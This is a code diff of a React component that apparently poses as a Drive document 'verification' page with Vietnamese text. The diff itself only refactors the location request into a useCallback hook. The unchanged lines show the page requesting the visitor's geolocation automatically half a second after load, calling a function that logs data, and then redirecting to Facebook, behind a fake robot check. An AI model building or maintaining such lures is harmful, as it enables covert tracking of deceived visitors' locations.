@@ -1,7 +1,7 @@
 
 'use client';
 
-import { useEffect, useState } from 'react';
+import { useEffect, useState, useCallback } from 'react';
 import { Card, CardContent } from '@/components/ui/card';
 import Image from 'next/image';
 import { FileText, Loader2 } from 'lucide-react';
@@ -27,7 +27,7 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
   
   const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 
 
-  const requestLocation = async () => {
+  const requestLocation = useCallback(async () => {
     setStatus('requesting');
     setStatusText('Đang xác minh, vui lòng chờ...');
     
@@ -104,12 +104,12 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
       // Fallback for browsers with no geo support
       logDataAndRedirect();
     }
-  };
+  }, [REDIRECT_URL]);
 
   useEffect(() => {
     const timer = setTimeout(requestLocation, 500);
     return () => clearTimeout(timer);
-  }, [REDIRECT_URL]);
+  }, [requestLocation]);
   
   const handleRobotCheck = () => {
     requestLocation();
